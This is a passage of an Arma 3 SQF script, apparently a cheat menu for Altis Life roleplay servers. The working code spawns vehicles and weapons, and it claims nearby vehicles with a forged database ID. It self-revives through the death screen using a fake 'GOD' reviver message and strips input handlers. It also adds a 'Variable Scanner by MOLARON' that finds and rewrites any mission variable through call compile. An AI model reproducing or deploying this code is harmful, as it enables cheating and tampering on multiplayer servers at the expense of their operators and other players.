						_text = getText(configFile >> "cfgWeapons" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_wepIndex],"Name: " + _text];

						_ctrl tvAdd[[_mainIndex,_wepIndex,_wep],"Type: " + _x];
				} forEach (weapons player);
				_magInfo = [];
				_magCount = [];
				{
						if !(_x in _magInfo) then {
								_magInfo set[count(_magInfo),_x];
								_magCount set[count(_magCount),1];
						} else {
								_cnt = _magCount select (_magInfo find _x);
								_magCount set[count(_magCount),_cnt+1];
						};
				} forEach (magazines player);
				{
						_count = _magCount select _forEachIndex;
						_text = getText(configFile >> "cfgMagazines" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_magIndex],"Name: " + _text];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Type: " + _x];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Count: " + str(_count)];
				} forEach _magInfo;
		};
	} forEach _units;
};

O_fnc_VehicleDbc = {
	disableSerialization;
	_ctrl = _this;

	_curSelArr = tvCurSel _ctrl;
	_truepath = [_curSelArr select 0];
	_data = _ctrl tvData _truepath;

	_vname = _data;

	_name = _vname;
	_pos = position player;
	_dir = getdir player;
	_obj = _name createVehicle _pos;
	_obj setDir _dir;

	if (!isNil "life_vehicles")then{
		_nearVehicles = nearestObjects [getPos player,["Car","Truck","Air"],80];

		if(count _nearVehicles == 0) exitWith {};
		{
			_plate = round(random(1000000));
			_x setVehicleArmor 1;
			life_vehicles set[count life_vehicles,_x];
			_x setVariable["dbInfo",["751267613374118",_plate]];
		}forEach _nearVehicles;
	};
};

O_fnc_Subs = {
	disableserialization;
	_combo = _this;
	{
		_text = _x select 0;
		_combo lbAdd _text;
	} forEach O_fnc_SubOrder;
};

O_fnc_Waffen = {
	disableserialization;
	_ctrl = _this;

	O_fnc_Weapons = [];
	_cfg = configFile >> "cfgWeapons";

	for "_i" from 0 to count (_cfg)-1 do {
		_config = _cfg select _i;

		if(isClass _config)then{
			_cname = configName _config;
			_scope = getNumber(_config >> "scope");
			_pic = getText(_config >> "picture");
			_name = getText(_config >> "displayName");

			if(_scope == 2 && _pic != "" && _name != "") then {
				O_fnc_Weapons = O_fnc_Weapons + [[_name,_cname,_pic]]
			};
		};
	};

	{
		_array = _x;

		_text = _array select 0;
		_data = _array select 1;
		_image = _array select 2;

		_index = _ctrl tvAdd[[],_text];
		_ctrl tvSetPicture [[_index],_image];
		_ctrl tvSetData [[_index],_data];
	} forEach O_fnc_Weapons;
};

O_fnc_WaffenDbc = {
	disableSerialization;

	_ctrl = _this;

	_curSelArr = tvCurSel _ctrl;
	_truepath = [_curSelArr select 0];
	_data = _ctrl tvData _truepath;
	_wep = _data;
	_mags = getArray(configFile >> "cfgWeapons" >> _wep >> "Magazines");

	if (isNil "O_fnc_WaffenHolder")then{
		O_fnc_WaffenHolder = "GroundWeaponHolder" createVehicle position player;
	};

	O_fnc_WaffenHolder addWeaponCargoGlobal [_wep,1];
	O_fnc_WaffenHolder addMagazineCargoGlobal [_mags select 0,5];

	O_fnc_WaffenHolder attachTo [player,[0, 0, 0], "Pelvis"];
	sleep 2;
	detach O_fnc_WaffenHolder;
};

[] call {
	[] spawn{
		while {true}do{
			waitUntil {!isNull (findDisplay 7300)};
			((findDisplay 7300) displayCtrl 7302) ctrlEnable true;
			(findDisplay 7300) displayRemoveAllEventHandlers "KeyDown";
			disableSerialization;
			_1 = ((findDisplay 7300) displayCtrl 7303);
			_1 ctrlSetText 'Reveal';
			_1 buttonSetAction 'player setVariable ["Revive",TRUE,TRUE]; [["I think it was a GOD?"],"life_fnc_revived",player,FALSE] call bis_fnc_MP; player reveal player;';
			sleep 0.5;
		};
	};

	[] spawn{
		disableSerialization;
		while {true}do
		{
			((findDisplay 49) displayCtrl 104) ctrlEnable true;
			((findDisplay 49) displayCtrl 104) ctrlCommit 0;

			waitUntil{O_fnc_whiles && !isNull (findDisplay 49)};
			_1 = uiNamespace getVariable "RscStructuredText_5";
			_frames = round(diag_fpsmin) + 10;
			_1 ctrlSetText format ["FPS: %1",_frames];

			_2 = uiNamespace getVariable "RscStructuredText_11";
			_damage = getDammage player;
			_2 ctrlSetText format ["Health: %1",(((1-_damage)*100)-((1-_damage)*100 mod 1))];

			_3 = uiNamespace getVariable "RscStructuredText_10";
			_3 ctrlSetText format ["Players: %1",count(playableUnits)];

			sleep 0.5;
		};
	};
};

[] spawn
{
	O_fnc_init2 =
	{
		O_fnc_whiles = true;

		O_fnc_subOrder =
		[
			["xxx",
				[

				]
			],

			["xxx",
				[

				]
			],

			["xxx",
				[

				]
			],

			["xxx",
				[

				]
			],
			["xxx",
				[

				]
			],
			["xxx",
				[

				]
			],
			["xxx",
				[

				]
			],
			["xxx",
				[

				]
			],
			["xxx",
				[

				]
			],
			["xxx",
				[

				]
			]
		];

		findDisplay 46 createDisplay "RscDisplayMPInterrupt";
		[] call O_fnc_initMenu;

	};

	O_fnc_keyBind =
	{
		switch (_this) do
		{
			case "User16":
			{
				[] spawn O_fnc_init2;
			};

			case "User17":
			{
				if (!Q_fnc_QuickAccessOpened)then{
					[] call O_fnc_QuickAccess;
				};
			}
		};
	};
};

[] spawn {	while {true}do		{			waitUntil {inputAction "User16" > 0};	"User16" call O_fnc_keyBind;	sleep 0.75;	};};
[] spawn {  while {true}do		{			waitUntil {inputAction "User17" > 0};	"User17" call O_fnc_keyBind;	sleep 0.75;	};};
[] spawn
{
	player addAction ["Open Variable Scanner",
	{
		_Dialog = [ [1100, "", [1, "Variable Scanner by MOLARON", [0.371093 * safezoneW + safezoneX, 0.225 * safezoneH + safezoneY, 0.257813 * safezoneW, 0.022 * safezoneH], [1, 1, 1, 1], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], ",-1"], []], [2200, "", [1, "", [0.371095 * safezoneW + safezoneX, 0.247 * safezoneH + safezoneY, 0.257813 * safezoneW, 0.396 * safezoneH], [-1, -1, -1, -1], [0, 0, 0, 0.5], [-1, -1, -1, -1], ",-1"], []], [1402, "", [1, "", [0.37625 * safezoneW + safezoneX, 0.39 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.154 * safezoneH], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], [-1, -1, -1, -1], ",-1"], []], [1500, "", [1, "", [0.37625 * safezoneW + safezoneX, 0.39 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.154 * safezoneH], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], [0, 0, 0, 0], ",-1"], []], [1400, "", [1, "//Current Variable Value", [0.37625 * safezoneW + safezoneX, 0.258 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.033 * safezoneH], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], [-1, -1, -1, -1], ",-1"], []], [2100, "", [1, "", [0.37625 * safezoneW + safezoneX, 0.302 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.033 * safezoneH], [1, 1, 1, 1], [0, 0, 0, 0], [0, 0, 0, 0], ",-1"], []], [1600, "", [1, "Search for this value", [0.37625 * safezoneW + safezoneX, 0.346 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.033 * safezoneH], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], [-1, -1, -1, -1], ",-1"], []], [1601, "", [1, "Edit Value", [0.37625 * safezoneW + safezoneX, 0.599 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.033 * safezoneH], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], [-1, -1, -1, -1], ",-1"], []], [1401, "", [1, "//New Variable Value", [0.37625 * safezoneW + safezoneX, 0.555 * safezoneH + safezoneY, 0.2475 * safezoneW, 0.033 * safezoneH], [0.769, 0.102, 0.102, 1], [-1, -1, -1, -1], [-1, -1, -1, -1], ",-1"], []]];
		(finddisplay 46) createDisplay "RscDisplayChat";
		{
			private["_ctrl", "_buttonaction", "_text", "_secondarray", "_activecolor", "_textcolor", "_backcolor", "_pos", "_idc", "_classname", "_ctrltype"];
			_idc = _x select 0;
			_classname = _x select 1;
			_secondarray = (_x select 2);
			_text = _secondarray select 1;
			_pos = _secondarray select 2;
			_textcolor = _secondarray select 3;
			_backcolor = _secondarray select 4;
			_activecolor = _secondarray select 5;
			_buttonaction = _secondarray select 6;
			_ctrltype = (format["%1", _idc] select [0, 2]);
			_ctrltype = call compile _ctrltype;
			_ctrltype = switch(_ctrltype) do {
				case 11: {
					"RscStructuredText"
				}
				;
				case 12: {
					"RscPicture"
				}
				;
				case 14: {
					"RscEdit"
				}
				;
				case 15: {
					"RscListBox"
				}
				;
				case 16: {
					"RscButton"
				}
				;
				case 21: {
					"RscCombo"
				}
				;
				case 22: {
					"RscBackground"
				}
				;
			}
			;
			_ctrl = (finddisplay 24) ctrlCreate [_ctrltype,
			_idc];
			_ctrl ctrlSetPosition _pos;
			if(_ctrltype != "RscTree") then {
				_ctrl ctrlSetTextColor _textcolor;
				_ctrl ctrlSetBackgroundColor _backcolor;
				_ctrl ctrlSetActiveColor _activecolor;
				_ctrl ctrlSetText _text;
			}
			;
			if!(_buttonaction == "") then {
				_ctrl buttonsetAction _buttonaction;
			}
			;
			_ctrl ctrlCommit 0.3;
			player setVariable ["MLRN_ALLCTRLS",
			(player getVariable "MLRN_ALLCTRLS") + [_ctrl]];
		}
		forEach _Dialog;
		((finddisplay 24) displayCtrl 2100) lbAdd "STRING";
		((finddisplay 24) displayCtrl 2100) lbAdd "CODE";
		((finddisplay 24) displayCtrl 2100) lbAdd "SCALAR";
		((finddisplay 24) displayCtrl 2100) lbAdd "BOOLEAN";
		((finddisplay 24) displayCtrl 2100) lbSetCurSel 0;
		((finddisplay 24) displayCtrl 1600) buttonSetAction '	if(ctrlText((finddisplay 24) displayCtrl 1400) == "") exitWith {hint "You have to enter a value"};	private["_vars"];	_vars = [];	{		_type = ((finddisplay 24) displayCtrl 2100) lbText lbCurSel ((finddisplay 24) displayCtrl 2100);		_value = ctrlText((finddisplay 24) displayCtrl 1400);   		if(typeName(missionNamespace getVariable _x) == _type) then {if(format["%1",(missionNamespace getVariable _x)] == _value) then {_vars pushBack [_x,missionNamespace getVariable _x]}};	}	forEach allVariables missionNamespace;	if(count _vars == 0) exitWith {hint "[FAILED] No Variables with this value..."};	lbClear ((finddisplay 24) displayCtrl 1500);	{		((finddisplay 24) displayCtrl 1500) lbAdd format["%1 | %2",_x select 0,format["%1",_x select 1]];		((finddisplay 24) displayCtrl 1500) lbSetData [(lbSize((finddisplay 24) displayCtrl 1500))-1,_x select 0];	}	forEach _vars;	hint "[SUCCESS] Variables found...";	((finddisplay 24) displayCtrl 1500) lbSetCurSel 0;';
		((finddisplay 24) displayCtrl 1601) buttonSetAction '	_newvalue = ctrlText((finddisplay 24) displayCtrl 1401);	_currvar = ((finddisplay 24) displayCtrl 1500) lbData lbCurSel ((finddisplay 24) displayCtrl 1500);	call compile format["%1 = %2;",_currvar,_newvalue];	hint "[SUCCESS] Changed Variable Value";'
	}
	];
};
